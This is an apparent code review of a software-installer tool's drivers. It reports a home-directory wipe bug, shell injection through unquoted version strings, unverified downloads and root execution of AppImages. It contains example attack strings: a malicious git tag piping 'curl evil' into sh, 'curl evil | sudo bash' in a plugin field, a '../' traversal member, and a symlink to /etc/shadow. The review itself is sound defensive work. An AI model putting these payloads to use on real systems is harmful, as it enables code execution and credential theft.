# Review: language-toolchain, ecosystem-installer, build/file-based and post-install drivers

Scope: `configsys/drivers/{cargo,pip,pipx,npm,gem,opam,luarocks,cabal,go_install,sdkman,pyenv,gcc,gcc_toolset,clang,source,tarball,appImage,font,script,service,group,_alt}.py`, read against `configsys/driver.py`, `configsys/runner.py`, `configsys/versions.py`, `configsys/installState.py`, `configsys/routecheck.py`, `routes.hu`, and the four external code plugins (`~/src/configsys-{blender,kicad,opencv,void}`) for ABI usage. All findings verified by reading (and one by a `--pretend` run).

## Themes

1. **One catastrophic data-loss path exists today.** A tarball binding with no `installDir:` resolves to the scope base itself, and `Tarball.install` ends with `rm -rf <dir> && mv <stage> <dir>`. `android-studio`'s default binding in core `routes.hu` has no `installDir:` (never has, since 560b6c8), so `configsys install android-studio` on a user-scope machine would execute `rm -rf $HOME`. Nothing in the driver or `routecheck` guards this.
2. **Security posture: execution is `bash -c <string>` with inherited env; the trust boundary is "whatever is in the loaded layers".** That is documented and acceptable for core routes, and data plugins are explicitly "sync freely, no prompt" (docs/plugins.md section 6) even though a data plugin's `install-cmd:`/`build:`/`build-path:` IS arbitrary code. The genuinely unowned input is the **network-discovered version string**: `source` splices it unquoted into the `build:` shell string (`_sub`), so a hostile git tag name (`;`, `$(`, backticks are all legal in refnames) becomes a shell injection. Downloads have no checksum/signature at all; extraction relies on GNU tar/unzip defaults for path safety (Alpine's busybox tar differs). System-scope appImage installs execute the freshly downloaded binary **as root** to extract an icon.
3. **Reuse: ~10 ecosystem installers are the same driver with a 5-entry command table.** cargo/pip/pipx/npm/gem/opam/luarocks/cabal/go-install/sdkman (1,131 lines) each re-declare `is_locked -> False`, `get_latest -> resolve_version`, the two ledger-lock stubs, a `_pkg` static accessor, and one-line f-string ops. About 300 lines are byte-identical shape and 20 `lock/unlock` methods produce the same string with the driver name swapped. `_alt.AltDriver` is a good precedent for the gcc/clang pair but `gcc_toolset` (an obvious `pm='dnf'` variant) re-implements it, and `_alt` bypasses the resolver's OS model by sniffing `shutil.which('dnf')`.
4. **Performance: batch enumeration is implemented for pip/pipx/npm only.** cargo has an `installed_index` but no `batch_index`, so inspect spawns `cargo install --list` once per crate; gem/luarocks/opam/pyenv/sdkman/go-install each spawn one (or, for sdkman, a full `sdkman-init.sh` source) per component even though each tool has a single list-everything call.
5. **Comment/code drift is concentrated in stale vocabulary and a few semantic claims**: four docstrings still say `!depends` (renamed to `requires:` long ago), `source` promises a pristine rebuild that the archive path does not deliver, `script` says commands "run through bash -c" (true) while the base `Runner.run` still carries a `presudo` parameter nothing passes, and `Driver.privileged` is in the frozen ABI list but no caller reads it.
6. **Tests exist for every driver in scope (the brief's "many have none" is out of date)** but they are command-construction tests only: no test covers `_installed_across_scopes` on a path driver, the tarball empty-`installDir` case, `_extract_cmd`'s zip detection with query strings, `Source` archive re-extraction, `AltDriver._pm()` on a non-apt/dnf host, `Font` uppercase extensions, or `Script.set_version` substitution.

Counts: HIGH 4, MED 14, LOW 12, NIT 6.

---

## Findings

### [HIGH] data-loss — Tarball install removes the scope base when `installDir` is absent; core `android-studio` hits it
- `configsys/drivers/tarball.py:26-29` (`_install_dir`: `rc.fields.get('installDir', '')`), `:102-103` (`rm -rf {dq} && mv {sq} {dq}`), `configsys/paths.py:184-192` (`install_dir('')` -> `scope_base / ''` == the base), `routes.hu:2530-2531` (android-studio tarball binding, no `installDir:`).
- Issue: an empty/missing `installDir` resolves to `$HOME` (user) or `/opt` (system). Verified with a pretend run: the generated command ends `... && rm -rf /home/u && mv /home/u.configsys-stage /home/u`. The routes comment two lines above says "unpacked scope-honoring (~/android-studio for user, /opt/android-studio for system)" — the intent was `installDir: android-studio`; it was never written (checked `git show 560b6c8:routes.hu`). `routecheck.py` has no lint for tarball `installDir` (it lints `script` `install-cmd` at :211-215, so the pattern exists).
- Why: this is the default binding on every non-Arch OS; one `configsys install android-studio` on a user-scope machine wipes the home directory. `uninstall` is marker-guarded (:120-121) but `install`'s swap is not.
- Recommendation: (a) fix the route (`installDir: "$CONFIGSYS_APP_DIR/android-studio"` like antigravity at :2522); (b) in `Tarball._install_dir`/`install`, refuse (`Result.fail`) when the resolved dir equals `paths.scope_base(scope)`, `paths.home`, `/`, or `/opt` — i.e. any dir that isn't strictly below the base and isn't a `locations:` override; (c) add a `routecheck` error `tarball-no-installdir` mirroring `script-no-install`; (d) add a unit test asserting a missing `installDir` is a preflight failure. Same guard applies to `AppImage._target` (`path` default `''` -> `$HOME`; `mv -f tmp $HOME` would drop the AppImage into the home dir — not destructive, but wrong) and `Source._src_dir` (safe today because the default is `$CONFIGSYS_SRC_DIR/<comp>`).

### [HIGH] security — `source` splices the network-discovered version unquoted into the `build:` shell string
- `configsys/drivers/source.py:86-88` (`_sub`: `.replace('$VERSION', version or '')`), `:119` (`version = self.resolve_version(rc)`), `:148` (`build = ' && '.join(self._sub(...))`), `:170` (`build-path` entries also pass through `_sub`), `:152` (`export PATH="{path}:$PATH"` — double-quoted, so `$(...)` expands).
- Issue: `version` comes from `versions.discover` — for `github:` specs it is a tag name scraped from the releases/tags atom feed (`versions.py:98-123`, `_html.unescape(unquote(...))`), optionally narrowed by `tag-re`. Git refnames may legally contain `;`, `&`, `|`, `$`, `(`, `)`, backticks and quotes. A tag `v1.2.3;curl${IFS}evil|sh` therefore executes inside the user's build shell (or, if the recipe uses `sudo make install`, partly as root). The `url:` discovery kind (`versions.py:270-279`) is the same input class and may be fetched over plain http. `_ref` correctly `shlex.quote`s the same value for `git checkout` (:136) and the marker `printf` (:153) — only `_sub` is unquoted, and only because `$VERSION` may be embedded mid-word in recipes (`foo-$VERSION.tar.gz`).
- Why: this is the one place a value that no configsys layer authored reaches a shell string. Core-routes trust does not cover it: a compromised or typo-squatted upstream repo (or MITM on an http `url:` version endpoint) is the threat.
- Recommendation: validate the discovered version against a strict allow-list before it can be spliced anywhere — e.g. `re.fullmatch(r'[A-Za-z0-9][A-Za-z0-9._+~-]*', v)` in `Driver.resolve_version` (or `versions.discover`), returning None/`Result.fail` otherwise. Apply the same check to `Script.set_version`'s `$VERSION` and to `Tarball`/`AppImage`/`Font` (they quote the URL, so they are safe today, but the invariant belongs in one place). Add tests with a hostile tag.

### [HIGH] security — system-scope appImage install executes the just-downloaded binary as root for icon extraction
- `configsys/drivers/appImage.py:85-88, 91-104` (`_extract_icon` runs `{tq} --appimage-extract .DirIcon` with `sudo=self.sudo(rc)`).
- Issue: for `scope: system` the downloaded file is executed under `sudo bash -c` before anything has verified it (no checksum, see below). `--appimage-extract` is handled by the AppImage runtime stub, but the file is whatever the URL served — a malicious or MITM'd payload runs as root. Additionally the icon is copied with `cp -Lf` (follows symlinks; a crafted `.DirIcon -> /etc/shadow` copies root-readable data into the user's icon dir) and, under sudo, `mkdir -p ~/.local/share/icons` + the icon file are created **root-owned inside the user's home** (`_icon_file` always uses `self._home()`, :47-48), which later breaks user writes there.
- Why: a user-scope install runs the app as the user, which they signed up for; running it as root is a privilege boundary they did not opt into for a menu icon.
- Recommendation: never run the AppImage with elevated privileges — run `_extract_icon` unprivileged always (the file is world-readable after `chmod +x`), or skip icon extraction for system scope; drop `-L` from the `cp`; write desktop/icon files as the invoking user only. Add a test asserting `_extract_icon` is not sudo'd under `scope: system`.

### [HIGH] security — no integrity verification on any downloaded artifact (tarball / appImage / font / source archive / apt keys)
- `configsys/driver.py:146-153` (`_fetch_and_extract`: `curl -fSL <url> -o tmp && tar -xf ...`), `tarball.py:87, 95`, `appImage.py:83`, `font.py:78`, `_alt.py:144` (`curl -fsSL <key> | tee /etc/apt/trusted.gpg.d/...`), `source.py:140-145`.
- Issue: the bindings have no `sha256:`/`sig:` field and the drivers never verify. `curl -L` follows redirects to any scheme; `file://`/`http://` URLs are accepted (tests rely on `file://`). The plugin *code* trust model went to the trouble of a content hash (`plugins.py:297-373`) but the *artifacts* those routes install — often run as root via `sudo make install` recipes or system-scope tarballs — are trusted on URL alone. `apt.py` at least re-fetches a key on signature failure; `_alt._repo_lines` installs a repo key by URL with no fingerprint check.
- Why: `driver-resilience-plan.md` already frames "validate-then-commit"; the memory notes "GPG signature verify" as open. A compromised CDN/redirector (`redirector.gvt1.com`, `edgedl.me.gvt1.com` in routes) is a realistic supply-chain vector for a tool whose whole job is installing software.
- Recommendation: add an optional `sha256:` (string or `{url: ...}`/`asset` glob for a checksums file) binding field, verified in `_fetch_and_extract`/the appImage/font curl steps before extraction (`sha256sum -c` in the shell fragment, or download via Python and verify in-process); make `configsys check` warn on system-scope download bindings lacking it; restrict URL schemes to `https` unless a `insecure: true` flag is set; document the residual trust in `docs/routing-model.md`.

### [MED] security — archive extraction relies on tool defaults for path traversal; not portable to busybox
- `configsys/driver.py:135-144` (`tar -xf`, `unzip -o -q`), `font.py:82` (`unzip -o -j` — fine, `-j` flattens).
- Issue: GNU tar strips leading `/` and rejects `..` members and delays outward symlinks by default; `unzip` warns-and-skips `../`. Alpine (a base OS in `routes.hu`) ships busybox `tar` with a different history of traversal CVEs, and neither call passes an explicit guard. `--strip-components` (source, `strip:`) does not change this. The extraction target is `stage`/`src` (user-writable) so a traversal escape lands relative to it — e.g. `../../.bashrc`.
- Recommendation: either extract in Python with `tarfile.extractall(filter='data')` / `zipfile` member-path checks (3.10.12+/3.11.4+ have the filter; the bootstrap already requires >=3.10), or at minimum add `--no-absolute-names` (GNU) and a pre-extraction `tar -tf | grep -E '(^|/)\.\.(/|$)|^/'` reject step in the shell fragment. Add a test with a crafted `../` member.

### [MED] security/trust-model — data plugins are "no prompt" but carry arbitrary shell (`install-cmd`, `build`, `build-path`, `uninstall-cmd`, `apt-source`)
- `docs/plugins.md:143-144` ("Data-only plugins: sync freely, no prompt... just data can't do too much harm"); `script.py:77-102`, `source.py:148-153, 167-171` (`# route data trusted`), `_alt.py:132-147` (`echo "deb {deb}" | tee /etc/apt/sources.list.d/...` under `sudo` — `$( )` inside the double quotes expands as root).
- Issue: a data plugin can add a `via: script` binding to any existing component (bindings merge additively across layers by `(via, when)`), with `install-cmd: 'curl evil | sudo bash'`, or a `clang-18` override with a hostile `apt-source.deb`. The user sees "install X" in the plan; the shell string is only visible in `--pretend`/`where`. The trust-model sentence is therefore inaccurate for these vias.
- Recommendation: treat bindings whose fields are shell (`script`, `source`, `apt-source`/`ppa`, `build-path`, apt `source-line`) from a *non-core, non-primary* layer as requiring the same content-hash trust as code, or surface them prominently (`check` warning "plugin X adds executable shell for component Y"; the TUI plan preview showing the command for those vias). At minimum correct docs/plugins.md section 6.

### [MED] correctness — `AltDriver._pm()` picks the package manager by host sniffing, bypassing the OS model
- `configsys/drivers/_alt.py:74-82` (`shutil.which('dnf')`, `os.environ.get('CONFIGSYS_PM')`).
- Issue: the resolver already knows the OS block's `native:`; the driver ignores it and also reads `os.environ` directly instead of `self.paths.env` (every other driver's convention — `pyenv.py:22`, `font.py:35`, `npm.py:49`). On a host with both `apt` and `dnf` (Fedora with a stray apt, or a Debian box with `dnf` installed for image builds) the wrong branch is taken; on openSUSE/Arch it silently emits apt commands (routes gate `via: gcc` on `debian`, so today this is only reachable via plugin bindings, but the driver has no defense).
- Recommendation: pass the OS's native manager into the driver (e.g. `rc.fields['native']` injected by the resolver, as `location-override` already is) or read it from `paths`; fall back to sniffing only when absent. Read `CONFIGSYS_PM` from `paths.env`.

### [MED] reuse — `GccToolset` duplicates `AltDriver` instead of being its dnf-only variant
- `configsys/drivers/gcc_toolset.py:20, 28-30, 43-50` duplicate `_alt.py:35, 50-52, 96-101` (`_VER_RE`, `_ver`, `get_version` parse) and re-implement dnf install/remove/upgrade already in `_alt._pm_install/_pm_remove/_pm_upgrade`.
- Recommendation: `class GccToolset(AltDriver)` with `_packages -> [f'gcc-toolset-{v}']`, `_master_bin -> /opt/rh/gcc-toolset-N/root/usr/bin/gcc`, `_pm -> 'dnf'` (forced), `location -> _prefix`. Removes ~50 lines and makes `get_latest` (currently `None`, :52-53) work for free via the dnf branch.

### [MED] reuse — ten ecosystem installers share one shape; extract a table-driven `ModuleDriver` base
- `cargo.py`, `pip.py`, `pipx.py`, `npm.py`, `gem.py`, `opam.py`, `luarocks.py`, `cabal.py`, `go_install.py`, `sdkman.py` (1,131 lines total). Identical in all ten: `is_locked -> False`; `lock/unlock -> Result('(<name> lock recorded in ledger)', 0)` (20 methods, 60 lines); `get_latest -> self.resolve_version(rc)` (8 of 10); a `@staticmethod _pkg/_dist/_crate/_gem/_rock/_cand(rc): return rc.name` (7 of 10); `location -> constant or scope-conditional constant`; one-line f-string ops with `shlex.quote(name)`; scope-honoring ones (npm/gem/luarocks) repeat the `'' if system else '--flag '` helper. `tarball/appImage/font/source/script/service/group/pyenv/gcc_toolset/_alt` repeat the lock/unlock pair too (another 20 methods).
- Recommendation: (1) put `is_locked -> False` and ledger-backed `lock/unlock` defaults on `Driver` (or a `LedgerLockMixin`) — every driver in scope overrides them identically, and only native managers have a real lock; (2) a `ModuleDriver(Driver)` with class-level `CMDS = {'install': 'cargo install {pkg}', 'uninstall': ..., 'upgrade': ..., 'set_version': 'cargo install --force --version {ver} {pkg}'}`, `USER_FLAG`/`SYSTEM_FLAG`, `LIST_CMD` + a `parse_list(stdout) -> {name: version}` hook so `installed_index`/`batch_index`/`get_version` come for free (see the perf finding); (3) keep bespoke logic (pipx backend probe, gem default-gem, cabal index ensure, go `@version`) as overrides. Rough saving: 350-450 lines and one place to fix quoting/scope bugs. This is data-driven command tables applied to code, which the CLAUDE.md philosophy already favours for routes.

### [MED] performance — cargo/gem/luarocks/opam/pyenv/sdkman/go-install probe per component during inspect
- `cargo.py:40-42` (`get_version` calls `installed_index()` — a full `cargo install --list` — per crate; no `batch_index`, so `installState._build_batch` (:152-178) never batches it despite `installed_index` existing); `gem.py:40` (`gem list -e` per gem, ~0.3-0.5 s each on a cold Ruby); `luarocks.py:35` (`luarocks list --porcelain <rock>` — the same call without the name lists everything); `opam.py:31` (same, `opam list --installed` lists all); `pyenv.py:30-32` (`pyenv versions --bare` per interpreter); `sdkman.py:36-37, 47-52` (every `get_version` sources `sdkman-init.sh`, ~0.5-1 s, then `sdk current` — while `~/.sdkman/candidates/<c>/current` is a symlink readable with zero subprocesses); `go_install.py:43-44` (`go version -m` per binary; `go version -m ~/go/bin/*` reports all at once).
- Why: the startup-perf work (memory: 50 s -> 4.4 s) batched apt/flatpak/npm/pipx/pip; these drivers are the remaining per-unit spawns and multiply with every crate/gem the user tracks.
- Recommendation: add `batch_index`/`batch_installed_index` to cargo (trivial: `return self.installed_index() or {}` like pip), and give gem/luarocks/opam/go-install a list-all `installed_index` + `batch_index`; sdkman should read the `current` symlink target (filesystem, no init) and only shell out for mutations; pyenv should list `~/.pyenv/versions/` once. The `ModuleDriver` base above makes this one hook per driver.

### [MED] correctness — `GoInstall.get_version` uses bare `go`, but install prepends the configsys-managed Go; inspection lies when Go is only the tarball
- `configsys/drivers/go_install.py:19-23` (comment: the runner shell doesn't have the managed go on PATH), `:44` (`go version -m ...` — bare), `:62-65` (`_go_install` prepends `_GO_PATH`).
- Issue: on a machine whose only Go is the configsys `go` tarball (the documented floor-pinned case), `get_version` fails (`go: command not found`) -> every go-install tool reads as not installed -> perpetual re-install prompts. `_GOBIN = '~/go/bin'` also ignores `GOBIN`/`GOPATH` env (`~` expands only because the string is passed to bash).
- Recommendation: route `get_version` through the same `PATH=` prefix (make `_go_install` a general `_go(subcmd)` like `Cargo._cargo`/`Cabal._cabal`), and honour `paths.env.get('GOBIN')`.

### [MED] correctness — `Gem.upgrade` omits `--user-install` at user scope
- `configsys/drivers/gem.py:33-35` (comment: "`--user-install` only applies to install; uninstall/update act over the gem path"), `:82-84` (`gem update <gem>` with no flag, `sudo=False` at user scope).
- Issue: `gem update` *does* accept `--user-install` (it takes the full install-options set); without it, RubyGems tries to write the system gem dir and fails with a permissions error for a user-scope gem unless `~/.gemrc` sets `gem: --user-install`. The comment is wrong about `update`; correct about `uninstall`.
- Recommendation: `gem update {self._user_flag(rc)}{gem}`; fix the comment; add a test asserting the flag.

### [MED] drift — `Source` promises a pristine rebuild; the archive path re-extracts over a stale tree
- `configsys/drivers/source.py:38-45` (docstring: "REBUILD SEMANTICS: install/upgrade REBUILD unconditionally from a PRISTINE tree"), `:125-137` (git path: `checkout -f` + `clean -xfd` — pristine), `:139-146` (archive path: `_fetch_and_extract(url, src, ...)` straight into the existing `src`, no removal).
- Issue: after an archive-based upgrade, files deleted upstream, stale `CMakeCache.txt`, and old objects persist; the docstring's guarantee (and the reason for it — "a recipe change or failed partial build can't be masked by stale state") does not hold. `Tarball` solves the same problem with a stage-and-swap (`tarball.py:70-104`).
- Recommendation: for the archive path, extract into a sibling stage and swap (reuse the tarball fragment), preserving only the version marker; or `rm -rf` the tree first with a marker guard. Add a test.

### [MED] test gaps — the in-scope drivers have command-construction tests but no coverage of the dangerous branches
- Gauge (all under `test/`): every driver in scope has a file (`test_{cargo,gem,go_install,npm,script,sdkman,service_group,font,gcc,clang,gcc_toolset,pip,pipx,source,tarball,appimage,opam_luarocks_cabal}*.py`, plus `test_toolchain_dnf.py`, `test_python_versions.py` for pyenv resolution). Missing:
  - tarball/appImage/source with **no** `installDir`/`path` (the HIGH above) — should be a preflight failure.
  - `_installed_across_scopes` restoring `rc.fields['scope']` and returning the *system* hit when the user path is empty (no test on any path driver).
  - `_extract_cmd` with a `.zip?token=…` URL (`:141` splits on `?` — untested) and `archive: zip` + `strip:` (strip is silently ignored for zip — undocumented).
  - `Source` archive path re-run (stale tree), `build-path` with `$SRC`, `uninstall-cmd` substitution.
  - `AltDriver._pm()` when neither/both PMs exist; `_repo_lines` with `key-path`/`list` overrides.
  - `Font` with `.TTF`/`.OTF` (uppercase — the `*.[to]tf` glob misses them; `unzip -C` would fix).
  - `Script.set_version` substitution and `version-re` with no group 1 (raises `IndexError` at `:58` — `m.group(1)` on a groupless regex).
  - `Pyenv` driver ops (only resolution is tested); `Pyenv.get_version` sort is lexical (`sorted(...)[-1]` at `:39` puts `3.11.9` above `3.11.10`).
  - `AppImage._extract_icon` sudo behaviour at system scope.
- Recommendation: add the above as a `test_driver_edges.py`; several are one-liners against the pretend runner.

### [MED] ABI — `Driver.privileged` is in the frozen surface but nothing reads it; `Runner.run(presudo=)` is a dead parameter
- `configsys/driver.py:15, 43` (`privileged` listed under "Class attributes to set"); grep of `configsys/*.py` + `configsys/tui/*.py` finds no reader (only driver definitions and test asserts). `configsys/runner.py:417-421, 456-459` (`presudo` documented and handled; no caller anywhere — memory notes "presudo retired").
- Issue: plugin authors are told to set a flag that has no effect; `sudo` is decided per-call by `self.sudo(rc)`/`sudo=True`. `presudo` is plumbing for a retired path.
- Recommendation: either make `privileged` meaningful (e.g. the plan preview/`check` uses it to warn "N privileged ops, one sudo prompt") or drop it from the ABI list at the next `ABI_VERSION` bump with a deprecation note; remove `presudo` from `Runner.run` (tests' `FakeRunner.run` signatures already omit it, `test_pipx_driver.py:23`).

### [MED] naming/consistency — home-dir and scope helpers are spelled four ways across the scope
- `cabal.py:20` `_CABAL_BIN = '~/.cabal/bin'` and `go_install.py:18` `_GOBIN = '~/go/bin'` (literal `~`, expanded by bash, ignores `paths.home` so `CONFIGSYS_HOME` test sandboxes leak to the real home); `cargo.py:24` `$HOME/.cargo/bin`; `pyenv.py:22-24`, `npm.py:49`, `appImage.py:32-33`, `font.py:29-30` each re-derive `self.paths.home if self.paths is not None else Path.home()`; `font.py:33` uses public `self.scope(rc)` while every other driver uses `self._scope(rc)` for the same decision; `sdkman.py:30` sets `default_scope = 'user'` (already the base default) while `opam/cabal/cargo/pip/pipx` don't.
- Recommendation: add `Driver.home()` (the `paths.home`-or-`Path.home()` fallback) and use it everywhere; use `$HOME`-free absolute paths from `home()` in cabal/go-install so sandboxes work; pick `_scope` consistently.

### [LOW] drift — stale `!depends` vocabulary in four driver docstrings
- `pip.py:6`, `pipx.py:5`, `appImage.py:11`, `font.py:9` say "driver `!depends`"; the model has been `drivers: { <via>: { requires: ... } }` since the capability port (`routes.hu:109-113`, `docs/routing-model.md:444` lists `!depends` only as the *old* form). `cargo.py:5`, `npm.py:9`, `opam.py:7` use the current term.
- Recommendation: s/`!depends`/`requires:`/ in the four docstrings.

### [LOW] drift — `pipx.py` docstring describes a routing that isn't there
- `pipx.py:5-7`: "modern OSs route it to apt, older ones bootstrap it with `pip install --user pipx` (the pip driver). See routes.hu." `routes.hu:920-…` (`pipx:` component) — worth confirming the pip-bootstrap binding still exists; the docstring also says `pipx` is "the driver `!depends`" (see above).
- Recommendation: re-verify against the component and trim the docstring to what the driver itself guarantees.

### [LOW] drift — `script.py` says "Runs userland (no sudo — a script needing root bakes it into its own command)" but the runner's pty path for internal sudo was retired
- `script.py:23-24`; `runner.py:24-32` (`_child_setctty`, teed pty gives the child its own ctty so an *internal* `sudo` can prompt) — this still works, so the statement is accurate, but core routes now carry `install-cmd: 'curl … | sudo bash'` (`routes.hu:1193, 1250, 1748`) that prompt on the pty per op rather than using the once-per-batch pre-auth (`_ensure_sudo` runs only for `sudo=True` or `presudo`, `runner.py:449, 458`).
- Recommendation: let a `script` binding declare `sudo: true` (driver passes `sudo=self.sudo(rc)`) so those routes get the batch pre-auth and appear as privileged in the plan; document it.

### [LOW] correctness — `Script._probe` raises on a `version-re` without a capture group
- `script.py:55-58`: `m.group(1)` — a route author writing `version-re: '[0-9.]+'` gets `IndexError: no such group` out of `get_version`, which `inspect_one` catches as a driver error row. `versions.py:278` handles the same case with `m.group(1) if m.groups() else m.group(0)`.
- Recommendation: same fallback; a `routecheck` lint that compiles `version-re` and warns on 0 groups.

### [LOW] correctness — `Pyenv.get_version` picks the "newest" patch lexically
- `pyenv.py:36-40`: `sorted(...)[-1]` over strings — `3.11.9` > `3.11.10`. `versionsweep._pv` (used by pipx at `:183`) exists for numeric comparison.
- Recommendation: sort with `_pv`/`packaging.version.Version`.

### [LOW] correctness — `Sdkman._spec`/`Pyenv._line` treat `version:` as a literal, but the base treats a dict as a discovery spec
- `sdkman.py:39-43`, `pyenv.py:26-28` (`str(rc.fields.get('version'))`); `driver.py:104-113` (dict -> `versions.discover`). A `version: { static: "21.0.2" }` (the form every other binding uses) becomes the shell word `{'static':` for these two.
- Recommendation: go through `self.resolve_version(rc)` (offline-safe for `static`) and only fall back to the raw string.

### [LOW] correctness — `Pyenv._line` falls back to `rc.comp`, which is `python3.11`, not `3.11`
- `pyenv.py:27-28` (`rc.fields.get('version') or rc.comp`), `routes.hu:208, 217, 226` always set `version:` so the fallback is dead-but-wrong: `pyenv install -s python3.11` is not a valid pyenv version name.
- Recommendation: derive with `re.search(r'\d+\.\d+', rc.comp)` or make `version:` required (routecheck).

### [LOW] performance — `Pipx._backend` probes `uv --version` even for `--pretend`, and `Cabal._ensure_index` shells `ls` per install
- `pipx.py:175-194` (probe runs under pretend too — the tests bake `'uv --version'` into every expected call list, `test_pipx_driver.py:55, 97`); `cabal.py:65-71` (an `ls` glob per install; cheap, but the presence check could be a Python `glob` on `home()`).
- Recommendation: skip the probe when `self._offline()`; it is a read-only check but it pollutes `--pretend` output and every pipx test.

### [LOW] security — `_alt._repo_lines` installs a keyring by URL, unverified, and echoes a route-authored deb line as root
- `_alt.py:141-146`: `curl -fsSL <key> | tee /etc/apt/trusted.gpg.d/<name>.asc`, `echo "deb {deb}" | tee ...`, both inside `sudo bash -c`. `clang.py:22` uses `http://apt.llvm.org/...` for the deb line (apt will verify signatures, so http is tolerable for the *list*; the key fetch is https). No fingerprint check on the key; `trusted.gpg.d` (deprecated) rather than `signed-by=` scoping means the key trusts *every* source, not just LLVM.
- Recommendation: write the key to `/etc/apt/keyrings/<name>.asc` and use `deb [signed-by=…]` (apt.py may already do this — align); optional `key-fingerprint:` verified with `gpg --show-keys --with-colons` before install.

### [LOW] reuse — `MARKER_PREFIX = '.configsys-'` and the marker read/`get_version` are copy-pasted in four drivers
- `tarball.py:15, 31-41`, `appImage.py:21, 40-58`, `font.py:18, 43-52`, `source.py:53, 75-102` — same constant, same `read_text().strip()` + `(FileNotFoundError, NotADirectoryError, OSError)` (the first two are subclasses of the third).
- Recommendation: `Driver._read_marker(path)` + `MARKER_PREFIX` in `driver.py`; external plugins (`blender.py:177-181`, `kicad.py:113-117`, `opencv.py:197-201`) implement the same marker via `printf`/`cat` and would use it too.

### [LOW] naming — `Driver.scope()` vs `Driver._scope()` differ only when `honors_scope` is False, and `AppImage` calls its driver `\\appImage`
- `driver.py:59-69`; `appImage.py:1` (docstring "the `\\appImage` driver" — the old backslash-family notation).
- Recommendation: collapse to one method (or document when each is intended); fix the docstring.

### [LOW] ABI — helpers external plugins actually depend on, for the break-candidate list
- Verified callers in `~/src/configsys-{blender,kicad,opencv}`: `location_override(rc)`, `scoped_dir(raw, rc)`, `self.paths.install_dir(...)`, `self.paths.home`, `Result.fail(...)`, `_scope(rc)` (opencv.py:91 — an *underscore* member the docstring says plugins must not rely on), `reconcile_scope` override, `runner.run(...)`. Not used externally: `_fetch_and_extract`, `_extract_cmd`, `_installed_across_scopes`, `_disco_spec`, `batch_index`, `installed_index`, `MARKER_PREFIX`.
- Implication: (a) `location_override`, `scoped_dir`, `Result.fail`, `reconcile_scope` are de-facto ABI — add them to the frozen list in `driver.py:13-27` (only `scoped_dir`/`sudo`/`scope`/`display_path` are listed today); (b) `_scope` is used by a shipped plugin — either promote it or fix opencv; (c) the free-to-change set is everything in the "not used" list, which is exactly what the reuse refactors above touch.

### [NIT] `Tarball.set_version` ignores its `version` argument and reinstalls the routed version
- `tarball.py:111-114`, `appImage.py:124-125`, `font.py:92-93`: the comment explains why, but the op silently succeeds with the wrong version. `Result.fail('version pinning unsupported for tarball')` (as `Script` does at `:97-101`) is the "no surprises" answer.

### [NIT] `Driver._extract_cmd` ignores `strip` for zip archives
- `driver.py:141-144`: `strip` only reaches the tar branch; a `strip: 1` on a zip URL is silently dropped. Document, or implement via a post-`unzip` `mv` of the single top-level dir.

### [NIT] `npm.batch_index` runs both scope listings unconditionally
- `npm.py:54-74`: two `npm ls -g` spawns even when every unit is user-scope. Filter `cmds` by the scopes present in `rcs`.

### [NIT] `Group.get_version` spawns a three-command pipeline for a group-membership test
- `group.py:34`: `id -nG "$(id -un)" | tr ' ' '\n' | grep -qx g` — `grp.getgrnam(g).gr_mem` + `os.getlogin()` in Python is no subprocess; or `id -nG` once as a batch.

### [NIT] `Font` glob misses uppercase font extensions
- `font.py:82` (`"*.[to]tf"`): many Nerd/Google font zips ship `.TTF`. `unzip -C` (case-insensitive matching) fixes it in one flag.

### [NIT] `Cargo`, `Cabal`, `Source` prepend toolchain bin dirs three different ways
- `cargo.py:24, 36`, `cabal.py:25, 33`, `go_install.py:23, 64`, `source.py:165-171`: each hardcodes its own `$HOME/...` dir and its own `PATH="…:$PATH"` prefix. A `Driver.toolchain_path()` (or `paths.toolchain_bindirs()`) returning the union would give every driver the same lookup and let `CONFIGSYS_SDK_DIR` overrides apply (source.py's comment at `:162-164` admits they don't today).
